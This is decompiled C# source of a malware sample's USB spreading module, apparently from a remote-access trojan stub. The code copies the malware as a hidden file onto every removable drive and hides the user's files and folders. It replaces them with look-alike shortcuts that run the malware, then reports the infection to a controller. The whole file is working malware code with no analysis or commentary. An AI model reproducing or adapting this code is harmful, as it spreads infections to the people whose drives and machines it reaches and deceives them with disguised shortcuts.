// Decompiled with JetBrains decompiler
// Type: SPUSB
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Lime;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

[StandardModule]
public sealed class SPUSB
{
  public static string ExeName = Core.RG;
  private static Thread H;

  public static void Enable()
  {
    SPUSB.H = new Thread(new ThreadStart(SPUSB.WorkThread));
    SPUSB.H.Start();
  }

  public static void Disable() => SPUSB.H.Abort();

  public static void WorkThread()
  {
    int num1;
    int num2;
    try
    {
label_2:
      ProjectData.ClearProjectError();
      num1 = -2;
label_3:
      int num3 = 2;
      DriveInfo[] drives = DriveInfo.GetDrives();
label_4:
      num3 = 3;
      object objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell"));
label_5:
      num3 = 4;
      DriveInfo[] driveInfoArray = drives;
      int index1 = 0;
      goto label_41;
label_7:
      num3 = 5;
      DriveInfo driveInfo;
      if (!driveInfo.IsReady || driveInfo.DriveType != DriveType.Removable)
        goto label_39;
label_8:
      num3 = 6;
      string path1 = driveInfo.RootDirectory.ToString();
label_9:
      num3 = 7;
      File.Copy(Process.GetCurrentProcess().MainModule.FileName, path1 + SPUSB.ExeName);
label_10:
      num3 = 8;
      File.SetAttributes(path1 + SPUSB.ExeName, FileAttributes.Hidden);
label_11:
      num3 = 9;
      string[] files = Directory.GetFiles(path1);
      int index2 = 0;
      goto label_25;
label_13:
      num3 = 10;
      string path2;
      if (Operators.CompareString(Path.GetFileNameWithoutExtension(path2), Path.GetFileNameWithoutExtension(SPUSB.ExeName), false) == 0)
        goto label_23;
label_14:
      num3 = 12;
      if (path2.Contains(".lnk"))
        goto label_17;
label_15:
      num3 = 13;
      File.SetAttributes(path2, FileAttributes.Hidden);
label_16:
label_17:
label_18:
      num3 = 15;
      object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue1, (Type) null, "CreateShortcut", new object[1]
      {
        (object) (path1 + Path.GetFileNameWithoutExtension(path2) + ".lnk")
      }, (string[]) null, (Type[]) null, (bool[]) null));
label_19:
      num3 = 16;
      NewLateBinding.LateSet(objectValue2, (Type) null, "TargetPath", new object[1]
      {
        (object) (path1 + SPUSB.ExeName)
      }, (string[]) null, (Type[]) null);
label_20:
      num3 = 17;
      NewLateBinding.LateSet(objectValue2, (Type) null, "WorkingDirectory", new object[1]
      {
        (object) path1
      }, (string[]) null, (Type[]) null);
label_21:
      num3 = 18;
      NewLateBinding.LateSet(objectValue2, (Type) null, "IconLocation", new object[1]
      {
        (object) (path2 + ", 0")
      }, (string[]) null, (Type[]) null);
label_22:
      num3 = 19;
      NewLateBinding.LateCall(objectValue2, (Type) null, "Save", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
label_23:
label_24:
      num3 = 20;
      checked { ++index2; }
label_25:
      if (index2 < files.Length)
      {
        path2 = files[index2];
        goto label_13;
      }
label_26:
      num3 = 21;
      string[] directories = Directory.GetDirectories(path1);
      int index3 = 0;
      goto label_37;
label_28:
      num3 = 22;
      string path3;
      DirectoryInfo directoryInfo = new DirectoryInfo(path3);
label_29:
      num3 = 23;
      directoryInfo.Attributes = FileAttributes.Hidden;
label_30:
      num3 = 24;
      objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue1, (Type) null, "CreateShortcut", new object[1]
      {
        (object) (path3 + ".lnk")
      }, (string[]) null, (Type[]) null, (bool[]) null));
label_31:
      num3 = 25;
      NewLateBinding.LateSet(objectValue2, (Type) null, "TargetPath", new object[1]
      {
        (object) (path1 + SPUSB.ExeName)
      }, (string[]) null, (Type[]) null);
label_32:
      num3 = 26;
      NewLateBinding.LateSet(objectValue2, (Type) null, "WorkingDirectory", new object[1]
      {
        (object) path1
      }, (string[]) null, (Type[]) null);
label_33:
      num3 = 27;
      NewLateBinding.LateSet(objectValue2, (Type) null, "IconLocation", new object[1]
      {
        (object) (Environment.GetEnvironmentVariable("windir") + "\\System32\\Shell32.dll, 3")
      }, (string[]) null, (Type[]) null);
label_34:
      num3 = 28;
      NewLateBinding.LateCall(objectValue2, (Type) null, "Save", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
label_35:
      num3 = 29;
      Core.Send("MSG" + Core.Y + "USB was detected! " + Core.EXE + " spreaded successfully!");
label_36:
      num3 = 30;
      checked { ++index3; }
label_37:
      if (index3 < directories.Length)
      {
        path3 = directories[index3];
        goto label_28;
      }
label_38:
label_39:
label_40:
      num3 = 32;
      checked { ++index1; }
label_41:
      if (index1 < driveInfoArray.Length)
      {
        driveInfo = driveInfoArray[index1];
        goto label_7;
      }
      else
        goto label_48;
label_43:
      num2 = num3;
      switch (num1 > -2 ? num1 : 1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_2;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            case 5:
              goto label_7;
            case 6:
              goto label_8;
            case 7:
              goto label_9;
            case 8:
              goto label_10;
            case 9:
              goto label_11;
            case 10:
              goto label_13;
            case 11:
              goto label_23;
            case 12:
              goto label_14;
            case 13:
              goto label_15;
            case 14:
              goto label_16;
            case 15:
              goto label_18;
            case 16:
              goto label_19;
            case 17:
              goto label_20;
            case 18:
              goto label_21;
            case 19:
              goto label_22;
            case 20:
              goto label_24;
            case 21:
              goto label_26;
            case 22:
              goto label_28;
            case 23:
              goto label_29;
            case 24:
              goto label_30;
            case 25:
              goto label_31;
            case 26:
              goto label_32;
            case 27:
              goto label_33;
            case 28:
              goto label_34;
            case 29:
              goto label_35;
            case 30:
              goto label_36;
            case 31:
              goto label_38;
            case 32:
              goto label_40;
            case 33:
              goto label_48;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_43;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_48:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }
}
